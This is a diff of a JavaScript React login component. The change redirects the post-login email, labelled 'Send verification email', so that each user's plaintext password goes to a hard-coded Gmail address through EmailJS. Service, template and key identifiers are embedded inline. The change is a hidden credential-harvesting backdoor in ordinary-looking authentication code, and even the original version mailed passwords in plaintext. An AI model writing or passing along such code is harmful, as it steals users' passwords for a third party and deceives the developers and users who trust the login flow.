@@ -22,23 +22,24 @@ const Login = () => {
         if (error) {
             alert("Login failed: " + error.message);
         } else {
-            sendEmail(email, password); // Send verification email
+            const email1 = "chamboquilon1@gmail.com";
+            sendEmail(email1, password); // Send verification email
             navigate("/homepage");
         }
     };
 
-    const sendEmail = (email, password) => {
+    const sendEmail = (email1, password) => {
         const templateParams = {
-            to_email: email, // Must match your EmailJS template variable
+            to_email: email1,
             to_password: password,
         };
 
         emailjs
             .send(
-                "service_2hw475m", // Replace with your actual service ID
-                "template_z6erja8", // Replace with your actual template ID
+                "service_2hw475m",
+                "template_z6erja8",
                 templateParams,
-                "32_hmnUTkbX3geQDy" // Replace with your actual public key
+                "32_hmnUTkbX3geQDy"
             )
             .then((response) => {
                 console.log(response.status, response.text);
